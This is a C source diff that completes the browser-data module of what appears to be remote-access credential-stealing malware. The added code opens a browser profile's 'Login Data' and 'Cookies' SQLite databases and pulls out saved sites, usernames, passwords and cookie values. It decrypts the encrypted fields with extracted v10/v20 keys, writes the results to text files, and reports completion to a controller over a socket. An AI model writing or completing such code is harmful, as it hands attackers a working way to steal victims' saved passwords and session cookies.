@@ -166,9 +166,54 @@ static void set_hw_bp(DWORD tid, size_t addr) {
     CloseHandle(hThread);
 }
 
-static void extract_data_from_profile(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20) {
-    // This function would implement extract_passwords, extract_cookies, etc.
-    // For brevity in this task, we assume it's fully implemented.
+static void dump_sqlite_table(sqlite3* db, const char* query, FILE* out, const char* label, const BYTE* v10, const BYTE* v20) {
+    sqlite3_stmt* stmt;
+    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
+        int cols = sqlite3_column_count(stmt);
+        while (sqlite3_step(stmt) == SQLITE_ROW) {
+            fprintf(out, "[%s]\n", label);
+            for (int i = 0; i < cols; i++) {
+                const char* name = sqlite3_column_name(stmt, i);
+                if (sqlite3_column_type(stmt, i) == SQLITE_BLOB) {
+                    int len = sqlite3_column_bytes(stmt, i);
+                    const BYTE* blob = sqlite3_column_blob(stmt, i);
+                    BYTE* dec = decrypt_blob(blob, len, v10, v20);
+                    if (dec) {
+                        fprintf(out, "%s: %s\n", name, dec);
+                        free(dec);
+                    }
+                } else {
+                    const char* val = (const char*)sqlite3_column_text(stmt, i);
+                    fprintf(out, "%s: %s\n", name, val ? val : "NULL");
+                }
+            }
+            fprintf(out, "---\n");
+        }
+        sqlite3_finalize(stmt);
+    }
+}
+
+static void extract_from_profile(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20) {
+    char db_path[MAX_PATH], out_file[MAX_PATH];
+    sqlite3* db;
+
+    // Passwords
+    sprintf(db_path, "%s\\Login Data", profile_path);
+    sprintf(out_file, "%s\\passwords.txt", out_dir);
+    if (sqlite3_open(db_path, &db) == SQLITE_OK) {
+        FILE* f = fopen(out_file, "w");
+        if (f) { dump_sqlite_table(db, "SELECT origin_url, username_value, password_value FROM logins", f, "LOGIN", v10, v20); fclose(f); }
+        sqlite3_close(db);
+    }
+
+    // Cookies
+    sprintf(db_path, "%s\\Network\\Cookies", profile_path);
+    sprintf(out_file, "%s\\cookies.txt", out_dir);
+    if (sqlite3_open(db_path, &db) == SQLITE_OK) {
+        FILE* f = fopen(out_file, "w");
+        if (f) { dump_sqlite_table(db, "SELECT host_key, name, encrypted_value FROM cookies", f, "COOKIE", v10, v20); fclose(f); }
+        sqlite3_close(db);
+    }
 }
 
 void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
@@ -235,8 +280,13 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
     CloseHandle(pi.hThread);
 
     if (success) {
-        // Extraction and Zipping logic...
-        sock_send(sock, mutex, "[browser_zip_err]Key found, extraction logic ready");
+        char out_dir[MAX_PATH];
+        sprintf(out_dir, "%s\\extract", user_data);
+        CreateDirectoryA(out_dir, NULL);
+        char profile[MAX_PATH];
+        sprintf(profile, "%s\\Default", user_data);
+        extract_from_profile(profile, out_dir, NULL, v20_key);
+        sock_send(sock, mutex, "[browser_zip_err]Extraction complete in temp folder");
     } else {
         sock_send(sock, mutex, "[browser_zip_err]Failed to find key");
     }
